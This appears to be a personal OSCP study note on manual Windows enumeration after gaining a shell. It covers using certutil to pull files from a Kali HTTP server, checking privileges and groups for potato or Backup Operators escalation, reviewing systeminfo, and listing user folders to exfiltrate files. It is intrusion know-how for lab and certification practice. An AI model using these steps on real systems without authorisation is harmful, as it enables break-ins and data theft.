# Windows Enumeration 

I will do **Manual Enumeration** before running WinPEAS. 

Now repeat that five times.

Many OSCP boxes are designed in a way where WinPEAS will not pick it up.

I assumed you got some kind of shell on a Windows host. If it is a shell from a webshell, try upgrading to a more stable shell by popping one with nc.exe (which you need to transfer from your kali) or a msfvenom payload.

## How to transfer files from Kali to Windows

Navigate to your tools folders and run the following (I like port 80 since it is highly likely that the target box will not have port 80 blocked)

```bash
python -m http.server 80
```

Back on your target box, navigate to a folder that you should have write and execute access.

I like using C:\Users\Public or if you land a shell as a user, you can use that user's directory.

```cmd
certutil.exe -urlcache -split -f http://<kali ip>/<file you want to transfer> <outputfilename>
```

The powershell equivalent is:

```powershell
iwr 
```


## Checking for the Quick Wins

Check the following:

1) Privileges and groups for your current user

- If SeImpersonatePrivilege is there, thank your lucky stars. Check the system arch with systeminfo and then upload the relevant potato exploit to elevate

- If SeShutDownPrivilege is there, note it down. Your PE path may involve service or scheduled task manipulation.

- Dont worry if it says disabled. The more important thing is that the Privilege is there.

- For groups, you are checking for any non default windows groups. Could be something like HelpDesk. Note things like 'Remote Management Users' (WinRM), 'Remote Desktop Users' (RDP) or the easy win 'Backup Operators'.

- If your user is part of 'BackUp Operators', your user can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer.

```cmd
whoami /priv

whoami /groups
```

2) Systeminfo

- Check the OS version and note the patches. If it looks ancient like Windows 7 or Windows Server 2012 or earlier, a kernel exploit like EternalBlue might be the solution. That said, I wont expect to see this in OSCP though you may see it for PG boxes. 

```cmd
systeminfo
```

3) Check the C:\Users directory. This helps you enumerate users and see (or not see) what access you have to their folders as the current user. 

- Note down any files that look out of place and exfiltrate them if required.

```cmd

cd C:\Users

tree /f /a  #this lists the current path in a recursive manner and also reveals hidden files and directories. This is a GREAT command. use this often

```